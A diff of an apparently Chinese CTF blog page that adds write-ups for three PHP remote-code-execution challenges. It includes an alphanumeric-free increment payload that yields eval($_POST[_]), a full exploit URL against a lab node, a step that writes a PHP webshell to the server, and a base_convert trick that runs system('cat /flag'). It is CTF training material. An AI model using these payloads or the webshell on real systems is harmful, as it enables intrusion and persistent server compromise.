@@ -42,8 +42,11 @@
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/rce/image-20240228215815368.png">
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/rce/image-20240228220105156.png">
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/rce/image-20240228220704922.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20240423203934004.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20240423212049369.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20240423212249246.png">
 <meta property="article:published_time" content="2024-01-04T13:22:59.000Z">
-<meta property="article:modified_time" content="2024-02-28T14:07:08.145Z">
+<meta property="article:modified_time" content="2024-04-25T12:38:51.919Z">
 <meta property="article:author" content="August Rosenberg">
 <meta property="article:tag" content="CTF刷题记录">
 <meta name="twitter:card" content="summary_large_image">
@@ -247,7 +250,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          3.5k words
+          8.3k words
         
       </span>
     
@@ -258,7 +261,7 @@
         
         
         
-          30 mins
+          69 mins
         
       </span>
     
@@ -457,6 +460,86 @@
 <p>0x02</p>
 <p>接下来就构造参数</p>
 <p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/rce/image-20240228220704922.png" srcset="/img/loading.gif" lazyload alt="image-20240228220704922"></p>
+<h1 id="FSCTF-2023-细狗2-0"><a href="#FSCTF-2023-细狗2-0" class="headerlink" title="[FSCTF 2023]细狗2.0"></a>[FSCTF 2023]细狗2.0</h1><p><strong>0x00</strong></p>
+<p>利用的知识点</p>
+<ol>
+<li>空格绕过</li>
+<li>过滤cat</li>
+</ol>
+<p><strong>0x01</strong></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20240423203934004.png" srcset="/img/loading.gif" lazyload alt="image-20240423203934004"></p>
+<h1 id="SWPUCTF-2021-新生赛-hardrce-3"><a href="#SWPUCTF-2021-新生赛-hardrce-3" class="headerlink" title="[SWPUCTF 2021 新生赛]hardrce_3"></a>[SWPUCTF 2021 新生赛]hardrce_3</h1><p><strong>0x00</strong></p>
+<p>使用的知识点</p>
+<ol>
+<li><p>无字母rce</p>
+<ul>
+<li><p>异或</p>
+</li>
+<li><p>取反</p>
+</li>
+<li><p>自增</p>
+<p>本道题就是用的是这个</p>
+</li>
+</ul>
+</li>
+</ol>
+<p><strong>0x01</strong></p>
+<p>源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;wllm&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$wllm</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;wllm&#x27;</span>];<br>    <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-string">&#x27;\^&#x27;</span>,<span class="hljs-string">&#x27;\~&#x27;</span>,<span class="hljs-string">&#x27;\|&#x27;</span>];<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$wllm</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;小伙子只会异或和取反？不好意思哦LTLT说不能用！！&quot;</span>);<br>    &#125;&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-zA-Z0-9]/is&#x27;</span>,<span class="hljs-variable">$wllm</span>))<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Ra&#x27;sAlGhul说用字母数字是没有灵魂的！&quot;</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;NoVic4说：不错哦小伙子，可你能拿到flag吗？&quot;</span>;<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$wllm</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;蔡总说：注意审题！！！&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>可以发现该题禁用了取反和异或，但是本道题又是无字母所以就可以尝试使用自增码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$_</span>=[];<span class="hljs-variable">$_</span>=@<span class="hljs-string">&quot;<span class="hljs-variable">$_</span>&quot;</span>;<span class="hljs-variable">$_</span>=<span class="hljs-variable">$_</span>[<span class="hljs-string">&#x27;!&#x27;</span>==<span class="hljs-string">&#x27;@&#x27;</span>];<span class="hljs-variable">$___</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$____</span>=<span class="hljs-string">&#x27;_&#x27;</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$_</span>=$<span class="hljs-variable">$____</span>;<span class="hljs-variable">$___</span>(<span class="hljs-variable">$_</span>[_]);<br></code></pre></td></tr></table></figure>
+
+<p>这个参数相当于是</p>
+<blockquote>
+<p>eval(@_POST[_]);</p>
+</blockquote>
+<p><strong>0x02</strong></p>
+<p>接下来构造payload </p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20240423212049369.png" srcset="/img/loading.gif" lazyload alt="image-20240423212049369"></p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://node4.anna.nssctf.cn:28173/?wllm=$_=%5B%5D;$_=@%22$_%22;$_=$_%5B%27!%27==%27@%27%5D;$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____=%27_%27;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_%5B_%5D);">http://node4.anna.nssctf.cn:28173?wllm=%24_%3D%5B%5D%3B%24_%3D%40%22%24_%22%3B%24_%3D%24_%5B%27%21%27%3D%3D%27%40%27%5D%3B%24___%3D%24_%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24____%3D%27_%27%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24_%3D%24%24____%3B%24___%28%24_%5B_%5D%29%3B</a></p>
+</blockquote>
+<blockquote>
+<p>_&#x3D;phpinfo();</p>
+</blockquote>
+<p>就执行了phpinfo()</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20240423212249246.png" srcset="/img/loading.gif" lazyload alt="image-20240423212249246"></p>
+<p>发现这个禁用了很多函数</p>
+<p>但是尝试</p>
+<p>写🐎</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">_=file_put_contents(&#x27;1.php&#x27;,&#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;aa&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;);</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>然后访问1.php 就可以了</p>
+<h1 id="CISCN-2019初赛-Love-Math"><a href="#CISCN-2019初赛-Love-Math" class="headerlink" title="[CISCN 2019初赛]Love Math"></a>[CISCN 2019初赛]Love Math</h1><p><strong>0x00</strong></p>
+<p>利用的知识点</p>
+<ol>
+<li>36进制变成函数</li>
+</ol>
+<p>使用的网站</p>
+<blockquote>
+</blockquote>
+<p><strong>0x01</strong> </p>
+<p>尝试使用base_convert</p>
+<p>全部转变成为10 -&gt;36 进制</p>
+<p>但是说长度超过了</p>
+<p><strong>0x02</strong></p>
+<p>尝试新的思路是</p>
+<p>整体可以理解为</p>
+<blockquote>
+<p>c&#x3D;($_GET[a])($_GET[b])&amp;a&#x3D;system&amp;b&#x3D;cat &#x2F;f*	</p>
+</blockquote>
+<p>但是GET是穿不了的，但是可以将其转化为ascii码值，然后调用，就需要hex2bin 然后没有hex2bin 可以使用10进制转36进制</p>
+<p>使用base_convert转化10进制为36 进制</p>
+<p>将16进制转变成为ascii码值，这一步可以使用hex2bin</p>
+<p>但是hex2bin不是白名单，可以尝试使用10-&gt;36得到</p>
+<p>那么hex2bin 需要的16进制，可以dechex从十进制变过来</p>
+<p>所以最终的payload 是</p>
+<blockquote>
+<p>$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&amp;pi&#x3D;system&amp;abs&#x3D;cat &#x2F;flag</p>
+</blockquote>
 
                 
               </div>
